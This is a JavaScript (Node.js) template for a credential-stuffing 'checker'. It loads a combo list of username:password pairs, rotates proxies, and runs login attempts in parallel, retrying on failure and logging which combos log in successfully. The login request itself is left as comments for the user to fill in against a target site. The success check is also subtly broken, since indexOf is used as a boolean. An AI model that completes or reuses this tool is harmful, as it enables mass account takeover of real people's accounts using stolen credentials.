// #region imports
const fs = require('fs');

const async = require('async');
const chalk = require('chalk');
const axios = require('axios');

// local libs

const proxyHandler = require('./lib/proxy-loader');
const comboHandler = require('./lib/combo-loader');
const titleManager = require('./lib/title-manager');

// #endregion

const config = JSON.parse(fs.readFileSync('./config.json'));

const ResultType = {
  Invalid: "invalid",
  Success: "success",
  Failure: "failure",
};

comboHandler.init(config.combo, combos => {
  titleManager.init("checker base", combos.length);

  proxyHandler.init(config.proxy, () => {  
    console.log(chalk.green('Starting..'));

    async.forEachLimit(combos, config.threads, (combo, callback) => {
      const credentials = combo.split(":");

      let result = ResultType.Invalid;

      let requestRunning = false;

      proxyHandler.get(p => {
        let proxy = p;

        setInterval(() => {
          if (result == ResultType.Invalid && !requestRunning) {
            requestRunning = true;
  
            axios({
              // see axios documentation
              
              // when doing login request use credentials[0] as user/email
              // and credentials[1] as password

              // as proxy host use proxy[0]
              // as proxy port use proxy[1]
            }).then(login => {
              if (login.data.indexOf('success key')) {
                  // do something, for example save to file etc.

                  console.log(chalk.green("Successfully logged in to"), chalk.yellow(combo));

                  requestRunning = false;

                  titleManager.hit();
                  titleManager.checkedCombo();

                  result = ResultType.Success;

                  setTimeout(callback, 1500);
              } else {
                if (login.data.indexOf('failure key')) {
                  console.log(chalk.red("Failed logging in to"), chalk.magenta(combo));
  
                  requestRunning = false;
  
                  titleManager.failure();
                  titleManager.checkedCombo();
  
                  result = ResultType.Failure;
  
                  setTimeout(callback, 1500);
                } else {
                  console.log(chalk.red("Error when logging in to"), chalk.magenta(combo), "(" + chalk.red(login.status, login.statusText) + ")");
  
                  titleManager.retry();
  
                  requestRunning = false;
                }
              }
            }).catch(loginErr => {
              console.log(chalk.red("Connection error when logging in to"), chalk.magenta(combo) + ",", chalk.red("retrying") + "..");
  
              titleManager.retry();
  
              requestRunning = false;
  
              if (config.changeProxyOnRetry) {
                proxyHandler.get(p => {
                  proxy = p;
                  
                  requestRunning = false;
                });
              } else {
                requestRunning = false;
              }
            });
          }
        }, 100);
      });
    }, (err) => err ? console.error : null);
  });
});